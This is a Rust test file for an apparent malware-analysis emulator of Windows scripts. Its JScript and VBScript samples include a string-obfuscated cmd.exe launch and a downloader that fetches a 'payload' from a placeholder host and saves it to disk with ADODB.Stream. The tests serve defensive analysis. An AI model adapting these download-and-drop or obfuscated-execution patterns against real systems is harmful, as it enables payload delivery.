use emulator_core::{AnalysisLimits, Host, VirtualHost};
use windows_script_emulator::{ScriptHost, ScriptLanguage, WindowsScriptEmulator};

fn host() -> VirtualHost {
    VirtualHost::new(AnalysisLimits::default())
}

#[test]
fn jscript_decodes_and_emits_process_intent() {
    let mut host = host();
    let mut emulator = WindowsScriptEmulator::new();
    let result = emulator
        .emulate(
            r#"
            var shell = new ActiveXObject("WScript.Shell");
            var command = ["c","m","d"].join("") + ".exe /c echo safe";
            WScript.Echo(String.fromCharCode(79,75));
            shell.Run(command);
            "#,
            ScriptLanguage::JScript,
            ScriptHost::CScript,
            &[] as &[String],
            &mut host,
            0,
        )
        .unwrap();
    assert_eq!(result.stdout, ["OK"]);
    assert_eq!(host.take_process_intents()[0].program, "cmd.exe");
}

#[test]
fn vbscript_functions_and_loops_work() {
    let mut host = host();
    let mut emulator = WindowsScriptEmulator::new();
    let result = emulator
        .emulate(
            r#"
Function Twice(value)
  Twice = value & value
End Function
Dim output
output = ""
For i = 1 To 3
  output = output & i
Next
WScript.Echo Twice(output)
"#,
            ScriptLanguage::VBScript,
            ScriptHost::WScript,
            &[] as &[String],
            &mut host,
            0,
        )
        .unwrap();
    assert_eq!(result.stdout, ["123123"]);
}

#[test]
fn xmlhttp_uses_synthetic_response() {
    let mut host = host();
    host.set_default_network_response_text("synthetic");
    let mut emulator = WindowsScriptEmulator::new();
    let result = emulator
        .emulate(
            r#"
var request = new ActiveXObject("MSXML2.XMLHTTP");
request.open("GET", "https://example.invalid/payload", false);
request.send();
WScript.Echo(request.responseText);
"#,
            ScriptLanguage::JScript,
            ScriptHost::WScript,
            &[] as &[String],
            &mut host,
            0,
        )
        .unwrap();
    assert_eq!(result.stdout, ["synthetic"]);
}

#[test]
fn vbscript_invokes_zero_argument_com_methods() {
    let mut host = host();
    host.set_default_network_response_text("synthetic");
    let mut emulator = WindowsScriptEmulator::new();
    emulator
        .emulate(
            r#"
Dim request, stream
Set request = CreateObject("MSXML2.XMLHTTP")
request.Open "GET", "https://example.invalid/payload", False
request.Send
Set stream = CreateObject("ADODB.Stream")
stream.Type = 1
stream.Open
stream.Write request.ResponseBody
stream.SaveToFile "C:\Temp\payload.bin", 2
"#,
            ScriptLanguage::VBScript,
            ScriptHost::WScript,
            &[] as &[String],
            &mut host,
            0,
        )
        .unwrap();

    assert_eq!(
        host.read_file(r"C:\Temp\payload.bin", emulator_core::Engine::Wscript, 0),
        Some(b"synthetic".to_vec())
    );
}

#[test]
fn hta_executes_mixed_languages() {
    let mut host = host();
    let mut emulator = WindowsScriptEmulator::new();
    let result = emulator
        .emulate(
            r#"
<html><script>var message = "safe";</script>
<script language="VBScript">WScript.Echo message & " hta"</script></html>
"#,
            ScriptLanguage::JScript,
            ScriptHost::Mshta,
            &[] as &[String],
            &mut host,
            0,
        )
        .unwrap();
    assert_eq!(result.stdout, ["safe hta"]);
}
